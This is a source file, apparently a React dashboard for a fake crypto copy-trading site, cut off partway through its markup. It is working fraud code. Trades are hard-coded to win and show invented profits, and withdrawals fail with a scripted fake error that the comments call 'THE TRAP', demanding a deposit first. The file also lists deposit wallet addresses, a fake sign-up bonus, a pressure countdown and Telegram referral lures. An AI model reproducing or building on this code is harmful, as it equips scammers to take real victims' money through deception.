
import React, { useState, useRef, useEffect } from 'react';
import { UserProfile, authService } from '../services/authService';
import { verifyPaymentProof, getInstantMarketPulse } from '../services/geminiService';

interface DashboardProps {
  user: UserProfile;
  onUserUpdate: (u: UserProfile) => void;
}

// STRATEGY UPDATE: High-Octane "Hook" Plans
const INVESTMENT_PLANS = [
  { id: 1, name: 'AI Flash Scalp', duration: '30 Seconds', durationMs: 30000, minRet: 20, maxRet: 25, risk: 'Low', minInvest: 500, vip: false },
  { id: 2, name: 'Rapid Momentum', duration: '1 Minute', durationMs: 60000, minRet: 30, maxRet: 40, risk: 'Medium', minInvest: 1000, vip: false },
  { id: 3, name: 'VIP Turbo Swing', duration: '5 Minutes', durationMs: 300000, minRet: 60, maxRet: 80, risk: 'Medium', minInvest: 2500, vip: true },
  { id: 4, name: 'Elite Market Maker', duration: '1 Hour', durationMs: 3600000, minRet: 120, maxRet: 150, risk: 'High', minInvest: 5000, vip: true },
  { id: 5, name: 'Whale Cycle (Pro)', duration: '4 Hours', durationMs: 14400000, minRet: 300, maxRet: 400, risk: 'High', minInvest: 10000, vip: true },
];

const SCAN_ASSETS = ['BTC/USDT', 'XAU/USD (GOLD)', 'EUR/USD', 'NASDAQ 100', 'ETH/USDT'];

// UPDATED NETWORKS - BEP20 Address Changed
const NETWORKS = [
  { id: 'trc20', name: 'USDT (TRC-20)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
  { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } 
];

type TradeStatus = 'idle' | 'bridging' | 'filling' | 'live' | 'completed';
type WithdrawStage = 'idle' | 'connecting' | 'verifying' | 'retrying' | 'error' | 'success';

const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
  const [copied, setCopied] = useState(false);
  const [affiliateCopied, setAffiliateCopied] = useState(false);
  
  // DEPOSIT STATES
  const [uploadStatus, setUploadStatus] = useState<'idle' | 'uploading' | 'success' | 'failed'>('idle');
  const [auditMessage, setAuditMessage] = useState<string>('');
  const [txId, setTxId] = useState('');
  const [timeLeft, setTimeLeft] = useState(1799); // 29:59 timer

  // WITHDRAW STATES
  const [withdrawStage, setWithdrawStage] = useState<WithdrawStage>('idle');
  const [withdrawLogs, setWithdrawLogs] = useState<string[]>([]);
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState<string>(''); // NEW: Amount State
  
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [pinError, setPinError] = useState(false);
  const [aiPulse, setAiPulse] = useState<{sentiment: string, score: number, brief: string} | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);
  const [selectedPlanId, setSelectedPlanId] = useState<number | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(500);
  const [isInvesting, setIsInvesting] = useState(false);
  
  // TRADING STATES
  const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
  const [tradeStatus, setTradeStatus] = useState<TradeStatus>('idle');
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [livePnL, setLivePnL] = useState(0);
  const [entryPrice, setEntryPrice] = useState(0);

  const [isSyncing, setIsSyncing] = useState(false);
  const [showBonus, setShowBonus] = useState(false);
  
  // Animation States
  const [signalStage, setSignalStage] = useState<'idle' | 'scanning' | 'injecting' | 'locked'>('idle');
  const [currentScanAsset, setCurrentScanAsset] = useState(SCAN_ASSETS[0]);

  const fileInputRef = useRef<HTMLInputElement>(null);
  const logsEndRef = useRef<HTMLDivElement>(null);
  const depositSectionRef = useRef<HTMLDivElement>(null);

  const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);

  // Timer Countdown Effect
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setInterval(() => setTimeLeft(t => t - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  useEffect(() => {
    if (isUnlocked && !aiPulse) {
      handleSignalUpdate(); // Initial load
      if (!user.hasDeposited && user.balance === 1000) {
        setShowBonus(true);
      }
    }
  }, [isUnlocked]);

  useEffect(() => {
    if (logsEndRef.current) {
      logsEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLogs]);

  // Update invest amount when plan changes to match minInvest
  useEffect(() => {
    if (selectedPlanId) {
      const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
      if (plan && investAmount < plan.minInvest) {
        setInvestAmount(plan.minInvest);
      }
    }
  }, [selectedPlanId]);

  const handleSignalUpdate = async () => {
    if (isAiLoading) return;
    setIsAiLoading(true);
    setSignalStage('scanning');

    // Phase 1: Scan Assets Animation
    let scans = 0;
    const scanInterval = setInterval(() => {
      setCurrentScanAsset(SCAN_ASSETS[scans % SCAN_ASSETS.length]);
      scans++;
    }, 200);

    await new Promise(r => setTimeout(r, 2000));
    clearInterval(scanInterval);

    // Phase 2: Injecting Capital Simulation
    setSignalStage('injecting');
    await new Promise(r => setTimeout(r, 1500));

    // Phase 3: Locked
    setSignalStage('locked');
    await new Promise(r => setTimeout(r, 800));

    // Phase 4: Fetch Real Data
    const pulse = await getInstantMarketPulse("Bitcoin/Ethereum Market");
    if (pulse) setAiPulse(pulse);
    
    setSignalStage('idle');
    setIsAiLoading(false);
  };

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === '4451') {
      setIsUnlocked(true);
      setPinError(false);
    } else {
      setPinError(true);
      setPinInput('');
      setTimeout(() => setPinError(false), 500);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(depositNetwork.address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleAffiliateCopy = () => {
    const refLink = 'http://t.me/MentorwithZuluTrade_bot';
    navigator.clipboard.writeText(refLink);
    setAffiliateCopied(true);
    setTimeout(() => setAffiliateCopied(false), 2000);
  };

  const handleTelegramShare = () => {
    const refLink = `${window.location.origin}/join?ref=${user?.email.split('@')[0]}`;
    const text = `🔥 Hey! I'm using CopyTrade to grow my capital. Join now using my link, and we both get a $1,000 sign-up bonus! Plus, earn $500 for every friend you invite. Secure and fast! 👇\n\n${refLink}`;
    window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent(text)}`, '_blank');
  };

  const triggerUpload = () => {
    fileInputRef.current?.click();
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setUploadStatus('uploading');
      setAuditMessage('Blockchain Confirmation Pending...');
      const reader = new FileReader();
      reader.onloadend = async () => {
        const base64String = (reader.result as string).split(',')[1];
        const result = await verifyPaymentProof(base64String, file.type);
        
        // Strict Check: Amount must be sufficient to unlock VIP (>= $500)
        if (result.is_valid && result.detected_amount >= 500) {
          setUploadStatus('success');
          setAuditMessage(`TxID Verified: ${result.detected_amount.toLocaleString()} USDT Credited. VIP PLANS UNLOCKED.`);
          setIsSyncing(true);
          const updated = authService.updateUser({ 
            hasDeposited: true, // UNLOCKS VIP TRADES
            balance: (authService.getUser()?.balance || 0) + result.detected_amount 
          });
          if (updated) {
            onUserUpdate(updated);
            alert("SUCCESS: VIP TRADING STRATEGIES UNLOCKED. You can now access high-yield plans.");
            setTimeout(() => setIsSyncing(false), 2000);
          }
        } else {
          setUploadStatus('failed');
          setAuditMessage(result.summary || "Receipt Invalid or Below VIP Threshold ($500).");
          setTimeout(() => setUploadStatus('idle'), 5000);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleMaxWithdraw = () => {
    setWithdrawAmount(user.balance.toString());
  };

  const handleWithdraw = () => {
    const amount = parseFloat(withdrawAmount);
    if (!withdrawAddress.trim() || !amount || amount <= 0) {
        alert("Please enter a valid wallet address and withdrawal amount.");
        return;
    }
    if (amount > user.balance) {
        alert("Insufficient liquidity. Withdrawal amount exceeds available balance.");
        return;
    }
    
    // SEQUENCE START
    setWithdrawStage('connecting');
    setWithdrawLogs([
        '> INITIALIZING QUANTUM HANDSHAKE...', 
        '> ENCRYPTING ASSET PACKET (AES-256)...', 
        '> BYPASSING MEMPOOL CONGESTION...'
    ]);

    // FAKE RETRY / DELAY for "VIBE"
    setTimeout(() => {
        setWithdrawStage('retrying');
        setWithdrawLogs(prev => [
            ...prev, 
            '> NODE LATENCY DETECTED (24ms)...',
            '> RE-ROUTING VIA PRIVATE INSTITUTIONAL CHANNEL...',
            '> ALLOCATING GAS FEES (COVERED BY SYSTEM)...'
        ]);
        
        // FINAL DECISION
        setTimeout(() => {
            if (!user.hasDeposited) {
                // FAILURE SCENARIO (THE TRAP)
                setWithdrawStage('error');
                setWithdrawLogs(prev => [
                    ...prev, 
                    '> VERIFYING DESTINATION WALLET WHITELIST STATUS...',
                    '> ❌ CRITICAL ERROR 909: EXTERNAL WALLET NOT WHITELISTED', 
                    '> PROTOCOL HALTED: SECURITY DEPOSIT REQUIRED TO ACTIVATE PAYOUT GATEWAY.'
                ]);
            } else {
                // SUCCESS SCENARIO
                setWithdrawStage('success');
                setWithdrawLogs(prev => [
                    ...prev, 
                    '> DESTINATION WALLET CONFIRMED.',
                    '> BATCH ID: #88392-ALPHA-CONFIRMED',
                    '> ✅ DISPATCH SUCCESSFUL.',
                    '> NOTE: FUNDS WILL REFLECT IN YOUR WALLET IN 10-15 MINUTES.'
                ]);
                
                // Deduct balance visually to sell the fake
                const newBal = user.balance - amount;
                const updated = authService.updateUser({ balance: newBal });
                if(updated) onUserUpdate(updated);
            }
        }, 2500); // Wait 2.5s for the second phase

    }, 2000); // Wait 2s for the first phase
  };

  const handlePlanSelection = (planId: number) => {
    if (isInvesting) return;
    
    const plan = INVESTMENT_PLANS.find(p => p.id === planId);
    
    // VIP LOCK LOGIC - STRICT ENFORCEMENT
    if (plan?.vip && !user.hasDeposited) {
      alert("🔒 VIP ACCESS DENIED\n\nThis high-yield strategy is reserved for verified partners. Please active your Mainnet Node (Deposit $500+) to unlock 50%+ ROI strategies.");
      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      return;
    }
    
    setSelectedPlanId(planId);
  };

  const startInvestment = () => {
    if (!user || selectedPlanId === null) return;
    const plan = INVESTMENT_PLANS.find(p => p.id === selectedPlanId);
    if (!plan) return;

    if (investAmount < plan.minInvest) {
      alert(`Min Investment for this plan is $${plan.minInvest}.`);
      return;
    }
    
    const currentU = authService.getUser();
    if (!currentU || currentU.balance < investAmount) {
      alert("Insufficient liquid balance. Please deposit funds.");
      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      return;
    }

    // 1. DEDUCT FUNDS IMMEDIATELY (ESCROW)
    const updatedBalance = currentU.balance - investAmount;
    const updatedInvested = currentU.totalInvested + investAmount;
    
    const updatedUser = authService.updateUser({ 
      balance: updatedBalance,
      totalInvested: updatedInvested
    });
    if (updatedUser) onUserUpdate(updatedUser);

    // 2. INITIALIZE TERMINAL
    setIsInvesting(true);
    setTradeStatus('bridging');
    setTerminalLogs([`> INIT_SEQUENCE_ALPHA_V4`, `> ALLOCATING ${investAmount} USDT...`]);
    setActiveTrade({ planName: plan.name, amount: investAmount, progress: 0 });

    // 3. EXECUTION SEQUENCE
    let step = 0;
    const bridgeInterval = setInterval(() => {
      step++;
      if (step === 1) setTerminalLogs(prev => [...prev, `> VERIFYING TRC-20 HASH...`]);
      if (step === 2) setTerminalLogs(prev => [...prev, `> BRIDGE CONTRACT: 0x75...9F2`]);
      if (step === 3) setTerminalLogs(prev => [...prev, `> LIQUIDITY POOL: CONNECTED`]);
      
      if (step === 4) {
        clearInterval(bridgeInterval);
        setTradeStatus('filling');
        const price = 64000 + Math.random() * 500;
        setEntryPrice(price);
        
        setTimeout(() => {
          setTradeStatus('live');
          startLiveTicker(plan, investAmount);
        }, 1500);
      }
    }, 600); // Faster bridge sequence
  };

  const startLiveTicker = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
    // FORCE WIN LOGIC: High profit probability
    const isWin = true; 
    const roiFactor = (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100;
    const targetProfit = amount * roiFactor;
    
    // Animation Duration
    const animationDuration = plan.durationMs <= 300000 ? plan.durationMs : 15000;
    
    let elapsed = 0;
    const updateInterval = 100; // 10 ticks per second
    
    const tickInterval = setInterval(() => {
      elapsed += updateInterval;
      const progress = Math.min(elapsed / animationDuration, 1);
      
      let currentPnL;
      
      if (progress < 0.2) {
        // Dip (-2% to -3%)
        const spread = amount * 0.03; 
        currentPnL = -spread * Math.sin(progress * Math.PI * 2.5); 
      } else {
        // Rip
        const adjustedProgress = (progress - 0.2) / 0.8;
        currentPnL = targetProfit * (1 - Math.pow(1 - adjustedProgress, 3));
        const noise = (Math.random() - 0.5) * (targetProfit * 0.05 * (1 - adjustedProgress));
        currentPnL += noise;
      }

      setLivePnL(currentPnL);
      setActiveTrade(prev => prev ? { ...prev, progress: progress * 100 } : null);

      if (elapsed >= animationDuration) {
        clearInterval(tickInterval);
        setLivePnL(targetProfit);
        finalizeTrade(amount, targetProfit, isWin);
      }
    }, updateInterval);
  };

  const finalizeTrade = (principal: number, profit: number, isWin: boolean) => {
    setTradeStatus('completed');
    
    const u = authService.getUser();
    if (!u) return;
    
    const payout = principal + profit;
    const newBalance = u.balance + payout;
    const newInvested = Math.max(0, u.totalInvested - principal);

    const updatedUser = authService.updateUser({
      balance: newBalance,
      totalInvested: newInvested,
      wins: isWin ? (u.wins + 1) : u.wins,
      losses: isWin ? u.losses : (u.losses + 1)
    });
    
    if (updatedUser) {
      onUserUpdate(updatedUser);
      setIsSyncing(true);
      
      setTimeout(() => {
        setIsSyncing(false);
        setIsInvesting(false);
        setTradeStatus('idle');
        setTerminalLogs([]);
        setLivePnL(0);
        setActiveTrade(null);
        setSelectedPlanId(null);
      }, 4000);
    }
  };

  return (
    <div className="bg-[#131722] min-h-screen pt-4 pb-32 px-4 sm:px-6 lg:px-8 relative">
      {showBonus && (
        <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/95 backdrop-blur-3xl animate-in fade-in duration-500">
           <div className="bg-[#1e222d] border-2 border-[#f01a64] w-full max-w-sm rounded-[3rem] p-8 text-center shadow-[0_0_100px_rgba(240,26,100,0.5)] space-y-6">
              <div className="text-6xl mb-4">🎉</div>
              <h2 className="text-2xl md:text-3xl font-black text-white uppercase tracking-tighter italic">CONGRATS!</h2>
              <p className="text-gray-300 font-bold leading-relaxed text-sm">
                You won <span className="text-[#00b36b] text-xl font-black">$1,000</span> for signing up! Use this trading credit to test our basic nodes.
              </p>
              <button 
                onClick={() => setShowBonus(false)}
                className="w-full bg-[#f01a64] hover:bg-pink-700 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs active:scale-95"
              >
                START TRADING
              </button>
           </div>
        </div>
      )}

      {!isUnlocked && (
        <div className="fixed inset-0 z-[100] backdrop-blur-3xl bg-black/80 flex items-center justify-center p-4 transition-all duration-500">
          <div className={`bg-[#1e222d] border border-[#2a2e39] w-full max-w-sm rounded-[2.5rem] p-8 md:p-10 shadow-[0_0_100px_rgba(240,26,100,0.2)] text-center space-y-6 md:8 ${pinError ? 'animate-shake' : 'animate-in zoom-in-95'}`}>
            <div className="flex justify-center">
              <div className="w-16 h-16 md:w-20 md:h-20 bg-[#f01a64]/10 rounded-full flex items-center justify-center text-[#f01a64] animate-pulse">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 md:h-10 md:w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
            </div>
            <div className="space-y-1">
              <h2 className="text-lg md:text-xl font-black text-white uppercase tracking-tighter">Terminal Locked</h2>
              <p className="text-[8px] md:text-[10px] text-gray-500 font-black uppercase tracking-[0.2em]">Neural Protection Active</p>
            </div>
            <form onSubmit={handleUnlock} className="space-y-6">
              <input 
                type="password" 
                maxLength={4}
                value={pinInput}
                autoFocus
                onChange={(e) => setPinInput(e.target.value)}
                placeholder="••••"
                className="w-full bg-[#131722] border-2 border-[#2a2e39] rounded-2xl py-4 text-center text-3xl font-black text-white focus:outline-none focus:border-[#f01a64] transition-all tracking-[0.5em] placeholder:tracking-normal placeholder:text-gray-700"
              />
              <button type="submit" className="w-full bg-[#f01a64] hover:bg-pink-700 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs active:scale-95">Verify Identity</button>
            </form>
          </div>
        </div>
      )}

      <div className="max-w-7xl mx-auto space-y-6 md:space-y-8">
        {/* STATS GRID */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-4">
          <div className="bg-[#1e222d] border border-[#2a2e39] p-4 md:p-5 rounded-[1.5rem] md:rounded-3xl shadow-xl overflow-hidden relative group">
            <span className="text-[7px] md:text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Liquid Balance</span>
            <div className="flex items-center gap-1.5 overflow-hidden">
               <span className="text-lg sm:text-2xl xl:text-3xl font-black text-[#00b36b] truncate">${user.balance.toLocaleString()}</span>
               <div className="w-1.5 h-1.5 bg-[#00b36b] rounded-full animate-pulse flex-shrink-0"></div>
            </div>
            <button onClick={() => setIsUnlocked(false)} className="absolute top-3 right-3 text-gray-700 active:text-[#f01a64]">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 md:h-4 md:w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </button>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-4 md:p-5 rounded-[1.5rem] md:rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[7px] md:text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Locked Equity</span>
            <span className="text-lg sm:text-2xl xl:text-3xl font-black text-white truncate block">${user.totalInvested.toLocaleString()}</span>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-4 md:p-5 rounded-[1.5rem] md:rounded-3xl shadow-xl overflow-hidden">
            <span className="text-[7px] md:text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1 truncate">Wins / Losses</span>
            <div className="flex items-baseline gap-1 overflow-hidden">
                <span className="text-lg sm:text-2xl xl:text-3xl font-black text-[#00b36b]">{user.wins}</span>
                <span className="text-gray-600 font-bold text-xs">/</span>
                <span className="text-lg sm:text-2xl xl:text-3xl font-black text-red-500">{user.losses}</span>
            </div>
          </div>
          <div className="bg-[#1e222d] border border-[#2a2e39] p-4 md:p-5 rounded-[1.5rem] md:rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden relative">
            <span className="text-[7px] md:text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-0.5 truncate">Node Status</span>
            <div className="flex items-center justify-center gap-1.5">
              <div className={`w-1.5 h-1.5 rounded-full ${isSyncing ? 'bg-amber-500 animate-ping' : 'bg-[#00b36b] animate-ping'}`}></div>
              <span className={`text-[8px] md:text-[10px] font-black uppercase tracking-widest truncate ${isSyncing ? 'text-amber-500' : 'text-[#00b36b]'}`}>
                {isSyncing ? 'Syncing Chain' : 'Connected'}
              </span>
            </div>
          </div>
        </div>

        {/* AFFILIATE NETWORK CARD */}
        <div className="bg-gradient-to-br from-[#1e222d] to-[#131722] border-2 border-[#0088cc]/30 p-6 md:p-8 rounded-[1.5rem] md:rounded-[2rem] shadow-2xl relative overflow-hidden group">
           <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#0088cc]/10 rounded-full blur-3xl group-hover:scale-125 transition-transform duration-700"></div>
           <div className="flex flex-col lg:flex-row gap-8 items-center relative z-10">
              <div className="shrink-0 w-20 h-20 bg-[#0088cc]/20 rounded-3xl flex items-center justify-center text-[#0088cc] shadow-inner animate-pulse">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.462 8.27l-1.56 7.42c-.116.545-.44.68-.895.425l-2.37-1.75-1.145 1.1c-.125.127-.23.234-.473.234l.17-2.42 4.41-3.98c.19-.17-.04-.26-.297-.09l-5.45 3.43-2.34-.73c-.51-.16-.52-.51.107-.756l9.15-3.53c.42-.15.79.1.663.667z"/>
                </svg>
              </div>
              <div className="flex-1 text-center lg:text-left min-w-0">
                <h3 className="text-xl md:text-2xl font-black text-white uppercase tracking-tighter mb-2">Elite Partner Network</h3>
                <p className="text-[10px] md:text-xs text-gray-400 font-bold uppercase tracking-widest mb-4 leading-relaxed max-w-2xl">
                  Unlock high-velocity income. Invite others to the terminal and receive an instant <span className="text-[#00b36b]">$500 USDT bounty</span> for every verified active trader you onboard.
                </p>
                <div className="flex flex-col sm:flex-row gap-3">
                  <button 
                    onClick={handleAffiliateCopy}
                    className="flex-1 bg-black/40 border border-[#2a2e39] rounded-xl px-4 py-3.5 flex items-center justify-center gap-2 hover:bg-black/60 transition-colors"
                  >
                    <span className="text-[9px] font-black uppercase tracking-widest text-[#0088cc]">{affiliateCopied ? 'REFERRAL LINK COPIED' : 'COPY REFERRAL LINK'}</span>
                  </button>
                  <button 
                    onClick={handleTelegramShare}
                    className="bg-[#0088cc] hover:bg-[#0077b5] text-white px-6 py-3.5 rounded-xl font-black text-[10px] uppercase tracking-widest shadow-xl active:scale-95 flex items-center justify-center gap-2 animate-pulse"
                  >
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.462 8.27l-1.56 7.42c-.116.545-.44.68-.895.425l-2.37-1.75-1.145 1.1c-.125.127-.23.234-.473.234l.17-2.42 4.41-3.98c.19-.17-.04-.26-.297-.09l-5.45 3.43-2.34-.73c-.51-.16-.52-.51.107-.756l9.15-3.53c.42-.15.79.1.663.667z"/></svg>
                    Share on Telegram
                  </button>
                </div>
              </div>
              <div className="shrink-0 bg-white/5 p-6 rounded-3xl border border-white/10 text-center w-full lg:w-48">
                <span className="text-[8px] text-gray-500 font-black uppercase tracking-widest block mb-1">USDT Wallet</span>
                <span className="text-2xl font-black text-[#00b36b] block">${user.balance.toLocaleString()}</span>
                <span className="text-[7px] text-gray-600 font-bold uppercase mt-2 block tracking-widest">Available Now</span>
              </div>
           </div>
        </div>

        {/* NEURAL INSIGHT SECTION */}
        <div className="bg-[#1e222d] border border-[#2a2e39] p-6 md:p-8 rounded-[1.5rem] md:rounded-[2rem] shadow-xl relative overflow-hidden">
          <div className="flex flex-col md:flex-row gap-6 md:gap-8 items-center">
            <div className="shrink-0 w-16 h-16 bg-[#f01a64]/10 rounded-2xl flex items-center justify-center text-[#f01a64] shadow-inner relative group">
              <svg xmlns="http://www.w3.org/2000/svg" className={`h-8 w-8 ${signalStage === 'scanning' ? 'animate-spin' : ''}`} viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="flex-1 text-center md:text-left min-w-0 w-full">
              <h3 className="text-sm md:text-base font-black text-white uppercase tracking-[0.1em] mb-1">Market Oracle</h3>
              <div className="space-y-1.5 animate-in fade-in">
                  <div className="flex flex-wrap items-center gap-2 justify-center md:justify-start">
                    <span className={`px-2 py-0.5 rounded text-[8px] md:text-[10px] font-black uppercase ${aiPulse?.score && aiPulse.score > 50 ? 'bg-[#00b36b]/10 text-[#00b36b]' : 'bg-red-500/10 text-red-500'}`}>
                        {aiPulse?.sentiment || 'Neutral'} ({aiPulse?.score || 50}%)
                    </span>
                  </div>
                  <p className="text-gray-300 font-mono text-[10px] md:text-[11px] leading-tight truncate">
                    {aiPulse ? `> ${aiPulse.brief}` : '> Awaiting signal synchronization...'}
                  </p>
              </div>
            </div>
            <button 
              onClick={handleSignalUpdate} 
              disabled={signalStage !== 'idle'}
              className="w-full md:w-auto px-6 py-3.5 bg-gradient-to-r from-[#f01a64] to-pink-600 rounded-xl text-[9px] md:text-[11px] font-black uppercase text-white shadow-lg active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {signalStage === 'idle' ? 'Scan Markets' : 'Scanning...'}
            </button>
          </div>
        </div>

        {/* LIVE LIQUIDITY TERMINAL */}
        {isInvesting && (
          <div className="bg-[#0d1117] border-2 border-[#f01a64] rounded-2xl p-6 relative overflow-hidden font-mono shadow-[0_0_30px_rgba(240,26,100,0.4)] transition-all duration-300">
            {/* MATRIX RAIN EFFECT OVERLAY */}
            <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'linear-gradient(rgba(0, 179, 107, 0.1) 1px, transparent 1px)', backgroundSize: '100% 4px' }}></div>

            {/* TERMINAL HEADER */}
            <div className="flex justify-between items-center mb-4 border-b border-[#2a2e39] pb-2 relative z-10">
              <div className="flex items-center gap-2">
                <div className={`w-2 h-2 rounded-full ${tradeStatus === 'completed' ? 'bg-[#00b36b] animate-ping' : 'bg-[#f01a64] animate-pulse'}`}></div>
                <span className={`${tradeStatus === 'completed' ? 'text-[#00b36b]' : 'text-[#f01a64]'} text-xs font-bold tracking-widest uppercase`}>
                   {tradeStatus === 'completed' ? 'PROFIT SECURED' : 'LIVE EXECUTION TERMINAL'}
                </span>
              </div>
              <span className="text-gray-500 text-[10px]">ETH-MAINNET BRIDGE</span>
            </div>

            {/* STAGE 1: BRIDGING LOGS */}
            {tradeStatus === 'bridging' && (
              <div className="h-24 overflow-y-auto no-scrollbar space-y-1 text-xs font-mono">
                {terminalLogs.map((log, i) => (
                  <div key={i} className="text-[#00b36b] animate-in slide-in-from-left duration-200">{log}</div>
                ))}
                <div ref={logsEndRef} />
              </div>
            )}

            {/* STAGE 2: FILL FLASH */}
            {tradeStatus === 'filling' && (
              <div className="h-24 flex flex-col items-center justify-center animate-pulse">
                <h3 className="text-2xl font-black text-[#00b36b] uppercase tracking-widest drop-shadow-[0_0_10px_rgba(0,179,107,0.5)]">ORDER FILLED</h3>
                <p className="text-white text-sm mt-1">BTC/USDT @ ${entryPrice.toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>
              </div>
            )}

            {/* STAGE 3: LIVE TICKER */}
            {(tradeStatus === 'live' || tradeStatus === 'completed') && (
              <div className="h-24 flex flex-col items-center justify-center relative z-10">
                <p className="text-gray-500 text-[10px] uppercase tracking-[0.3em] mb-1">Unrealized PnL</p>
                <div className={`text-5xl md:text-6xl font-black tracking-tighter tabular-nums transition-colors duration-300 ${livePnL >= 0 ? 'text-[#00b36b] drop-shadow-[0_0_15px_rgba(0,179,107,0.4)]' : 'text-red-500'}`}>
                  {livePnL >= 0 ? '+' : ''}{livePnL.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                </div>
                {tradeStatus === 'completed' && (
                  <div className="mt-2 text-[#00b36b] text-xs font-black uppercase tracking-[0.3em] animate-pulse border border-[#00b36b] px-3 py-1 rounded-full bg-[#00b36b]/10">
                    FUNDS RELEASED TO WALLET
                  </div>
                )}
              </div>
            )}

            {/* PROGRESS BAR FOOTER */}
            <div className="mt-4 bg-[#1e222d] h-1.5 w-full rounded-full overflow-hidden relative z-10">
               <div className={`${tradeStatus === 'completed' ? 'bg-[#00b36b]' : 'bg-[#f01a64]'} h-full transition-all duration-300`} style={{ width: `${activeTrade?.progress || 0}%` }}></div>
            </div>
          </div>
        )}

        {/* MAIN GRID */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 md:gap-8">
          <div className="lg:col-span-2 space-y-6">
            <h3 className="text-lg md:text-xl font-black text-white uppercase tracking-tighter px-1">Profit Strategies</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4">
              {INVESTMENT_PLANS.map((plan) => (
                <div 
                  key={plan.id} 
                  onClick={() => handlePlanSelection(plan.id)}
                  className={`bg-[#1e222d] border-2 ${selectedPlanId === plan.id ? 'border-[#f01a64]' : 'border-[#2a2e39]'} p-5 md:p-6 rounded-[1.5rem] md:rounded-[2rem] cursor-pointer hover:border-[#f01a64] transition-all relative overflow-hidden active:scale-[0.98] ${plan.vip && !user.hasDeposited ? 'opacity-60 grayscale cursor-not-allowed' : ''}`}
                >
                  {/* VIP LOCK OVERLAY for Non-Depositors */}
                  {plan.vip && !user.hasDeposited && (
                    <div className="absolute top-2 right-2 z-10">
                      <div className="bg-black/60 backdrop-blur-md p-1.5 rounded-lg border border-white/10">
                         <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                         </svg>
                      </div>
                    </div>
                  )}

